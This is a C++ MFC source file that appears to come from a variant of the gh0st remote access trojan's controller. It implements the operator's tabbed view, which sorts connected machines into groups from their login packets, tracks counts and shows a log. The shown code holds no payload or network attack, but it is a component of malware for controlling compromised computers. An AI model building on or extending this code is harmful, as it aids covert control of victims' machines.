// gh0stView.cpp : implementation of the CGh0stView class
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "gh0stView.h"

#include "PcView.h"
#include "LogView.h"
#include "ShowNum.h"
#include "UPDATEIP.h"
#include "proxy.h"
#include "CDebug.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

//#define IDC_TABCONTROL 100
CFont font;
CGh0stView*         g_pTabView;
extern CPcView*     g_pConnectView;
extern CLogView*	g_pLogView;
extern CShowNum*	g_pNumDlg;
extern CUPDATEIP*	g_pUpdateIP;
extern CProxy*		g_pProxy;
/////////////////////////////////////////////////////////////////////////////
// CGh0stView

#define ID_LIST_PAG 60000;

IMPLEMENT_DYNCREATE(CGh0stView, CView)

BEGIN_MESSAGE_MAP(CGh0stView, CView)
	//{{AFX_MSG_MAP(CGh0stView)
	ON_WM_SIZE()
	ON_WM_CREATE()
	ON_WM_ERASEBKGND()
	ON_WM_PAINT()
	ON_WM_SHOWWINDOW()
	//}}AFX_MSG_MAP
	ON_NOTIFY(TCN_SELCHANGE, IDC_TABCONTROL, OnSelectedChanged)
	ON_WM_MOUSEACTIVATE()
	ON_MESSAGE(WM_ADDFINDGROUP, OnAddFindGroup)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stView construction/destruction

CGh0stView::CGh0stView()
{
	// TODO: add construction code here
	g_pTabView = this;
}

CGh0stView::~CGh0stView()
{
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= WS_CLIPCHILDREN;		//裁剪子窗口
	return CView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView drawing

void CGh0stView::OnDraw(CDC* pDC)
{
	CGh0stDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView diagnostics

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif
/////////////////////////////////////////////////////////////////////////////
// CGh0stView message handlers
BOOL CGh0stView::AddView(CRuntimeClass* pViewClass, LPCTSTR lpszTitle)
{
	CCreateContext contextT;
	contextT.m_pCurrentDoc     = GetDocument();
	contextT.m_pNewViewClass   = pViewClass;
	contextT.m_pNewDocTemplate = GetDocument()->GetDocTemplate();
	
	CWnd* pWnd;
	TRY
	{
		pWnd = (CWnd*)pViewClass->CreateObject();
		if (pWnd == NULL)
		{
			AfxThrowMemoryException();
		}
	}
	CATCH_ALL(e)
	{
		TRACE0( "Out of memory creating a view.\n" );
		// Note: DELETE_EXCEPTION(e) not required
		return FALSE;
	}
	END_CATCH_ALL
		
		DWORD dwStyle = AFX_WS_DEFAULT_VIEW;
	dwStyle &= ~WS_BORDER;
	
	int nTab = m_wndTabControl.GetItemCount();
	
	// Create with the right size (wrong position)
	CRect rect(0,0,0,0);
	UINT nID = AFX_IDW_PANE_FIRST + nTab;
	if (!pWnd->Create(NULL, NULL, dwStyle, rect, &m_wndTabControl, nID, &contextT))
	{
		TRACE0( "Warning: couldn't create client tab for view.\n" );
		// pWnd will be cleaned up by PostNcDestroy
		return NULL;
	}


	TCITEM   item;
	item.mask = TCIF_TEXT;
	item.pszText = (LPSTR)lpszTitle;
	item.lParam = (UINT)pWnd->m_hWnd;		//保存指针的句柄
	item.mask = TCIF_TEXT|TCIF_PARAM;
	//m_wndTabControl.InsertItem(nTab, lpszTitle, pWnd->GetSafeHwnd());
	m_wndTabControl.InsertItem(nTab, &item);
	
	pWnd->SetOwner(this);
	
	//strLog.Format("%s\r\n", GetTextFromTCItem(0));
	//sendLog();
	//SetTextTCItem(0, _T("zzzz"));
	//strLog = "11111";
	//SetTextTCItem(0, (LPSTR)(LPCTSTR)strLog);

	return TRUE;
	
}

LRESULT CGh0stView::OnAddFindGroup(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	try
	{	
		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;
		
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		
		BOOL bFind=false;
		CString strGroupName, strTemp;
		
		int nTabs = m_wndTabControl.GetItemCount();
		for ( int i = 0; i < nTabs; i++)
		{
			strTemp = TCItem_GetText(i);
			int n = strTemp.ReverseFind('(');
			if( n > 0 )
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if (strGroupName == LoginInfo->UpGroup)
			{	
				bFind = true;
				
				CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(TCItem_GetHandle(i)));
				pView->m_iocpServer = g_pConnectView->m_iocpServer;
				pView->PostMessage( WM_ADDTOLIST, 0, (LPARAM)pContext );
				break;
			}
		}
		if (!bFind)
		{	
			strGroupName.Format( "%s(1)", LoginInfo->UpGroup );
			AddGroup( strGroupName );
			CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(TCItem_GetHandle(nTabs)));
			pView->NewInitialUpdate();
			pView->m_iocpServer = g_pConnectView->m_iocpServer;
			pView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext );
		}
	}
	catch (...){}
	
	return 0;
}

HWND CGh0stView::TCItem_GetHandle(int index)
{
	TCITEM item;
	item.mask = TCIF_PARAM;
	item.lParam = 0;
	m_wndTabControl.GetItem(index, &item);
	return (HWND)item.lParam;
}

HWND CGh0stView::TCSelItem_GetHandle()
{
	int nCurSel = m_wndTabControl.GetCurSel();
	return TCItem_GetHandle(nCurSel);
}

void CGh0stView::TCItem_SetText(int index, LPSTR tit)
{
	TCITEM item;
	//TCHAR buffer[256] = { 0 };
	item.pszText = tit;
	item.cchTextMax = 256;
	item.mask = TCIF_TEXT;
	m_wndTabControl.SetItem(index, &item);
}

LPSTR CGh0stView::TCItem_GetText(int index)
{
	TCITEM item;
	TCHAR buffer[256] = {0};
	item.pszText = buffer;
	item.cchTextMax = 256;
	item.mask = TCIF_TEXT;
	m_wndTabControl.GetItem(index, &item);
	return item.pszText;
}

void CGh0stView::OnSize(UINT nType, int cx, int cy) 
{
	CView::OnSize(nType, cx, cy);

	if (m_wndTabControl.GetSafeHwnd())
		m_wndTabControl.MoveWindow(0, 0, cx, cy-l_Botton-l_Split_C);

	CWnd *pwnd2;
	HWND hWnd = TCItem_GetHandle(TabIndex);
	pwnd2 = CWnd::FromHandle(hWnd);
	CRect rect1;
	m_wndTabControl.GetItemRect(0, &rect1);
	int i_tit_h = rect1.bottom - rect1.top;
	if (pwnd2) 	
		pwnd2->SetWindowPos(NULL, 0, 0, cx, cy-l_Botton-l_Split_C-i_tit_h, SWP_NOZORDER|SWP_NOMOVE);

	//log
	CWnd *pwnd; 
	pwnd = GetDlgItem(ID_LIST_LOG);
	if (pwnd)
	{				
		pwnd->SetWindowPos(NULL, 0, 0, cx, l_Botton, SWP_NOZORDER|SWP_NOMOVE);
		pwnd->SetWindowPos(NULL, 0, cy - l_Botton,0,0, SWP_NOZORDER|SWP_NOSIZE);
	}
}

void CGh0stView::UpdateDocTitle()
{
	GetDocument()->UpdateFrameCounts();
}

void CGh0stView::OnSelectedChanged(NMHDR* pNMHDR, LRESULT* pResult)
{
	UNUSED_ALWAYS(pNMHDR);
	*pResult = 0;
	
	UpdateDocTitle();
	
	CFrameWnd* pFrame = GetParentFrame();
	CView* pView = DYNAMIC_DOWNCAST(CView, CWnd::FromHandle(TCSelItem_GetHandle()));
	ASSERT_KINDOF(CView, pView);
	
	pFrame->SetActiveView(pView);
}

int CGh0stView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	// TODO: Add your specialized creation code here
	l_Botton = 200;
	l_Split_C = 1;
	TabIndex = 0;
	m_wndTabControl.Create(WS_CHILD|WS_VISIBLE|TCS_BOTTOM , CRect(0, 0, 0, 0), this, IDC_TABCONTROL);
	AddGroup(_T("默认分组(0)"));	//标签名称
	m_wndTabControl.SetCurSel(0);

	g_pLogView     = new CLogView();
	g_pNumDlg      = new CShowNum();
	g_pUpdateIP    = new CUPDATEIP();
	g_pProxy       = new CProxy();
	
	g_pLogView->Create(NULL, _T(""), WS_VISIBLE | WS_CHILD | LVS_REPORT, CRect(0, 0, 0, 0), this, ID_LIST_LOG);
	

	return 0;
}

int CGh0stView::OnMouseActivate(CWnd* pDesktopWnd, UINT nHitTest, UINT message)
{
	return CWnd::OnMouseActivate(pDesktopWnd, nHitTest, message);
}

BOOL CGh0stView::AddGroup( LPCTSTR lpszTitle )
{
	BOOL Result = AddView(RUNTIME_CLASS(CPcView), lpszTitle);
	return Result;
}

BOOL CGh0stView::OnEraseBkgnd(CDC* /*pDC*/) 
{
	// TODO: Add your message handler code here and/or call default
	return TRUE;
}

BOOL CGh0stView::UpDateNumber()
{	
	CString strGroupName, strTemp;
	int nTabs = m_wndTabControl.GetItemCount();
	
	for ( int i = 0; i < nTabs; i++ )
	{	
		strTemp = TCItem_GetText(i);
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		CPcView* pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(TCItem_GetHandle(i)));

/*		//自动删除 多余分组
		if (pView->m_pListCtrl->GetItemCount() == 0 && strGroupName != "默认分组")
		{
			m_wndTabControl.DeleteItem(i);
			i--;
			nTabs--;
			continue;
		}
*/
		strTemp.Format( "%s(%d)", strGroupName, pView->m_pListCtrl->GetItemCount() );
		//m_wndTabControl.GetItem(i)->SetCaption(strTemp);
		TCItem_SetText(i, (LPSTR)(LPCTSTR)strTemp);
	}
	return TRUE;
}

void CGh0stView::OnPaint() 
{
	CPaintDC dc(this); // device context for painting

	//CFont font;
	font.CreatePointFont(9*10,_T("微软雅黑"),&dc);
	m_wndTabControl.SetFont(&font);
	
	// TODO: Add your message handler code here
	
	// Do not call CView::OnPaint() for painting messages
}

void CGh0stView::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CView::OnShowWindow(bShow, nStatus);

	// TODO: Add your message handler code here

}

void CGh0stView::OnInitialUpdate() 
{
	CView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	DWORD d_tcs = m_wndTabControl.GetExtendedStyle();
	d_tcs|=TCS_BUTTONS;
	d_tcs|=TCS_BOTTOM;
	m_wndTabControl.SetExtendedStyle(d_tcs, 0);	
}
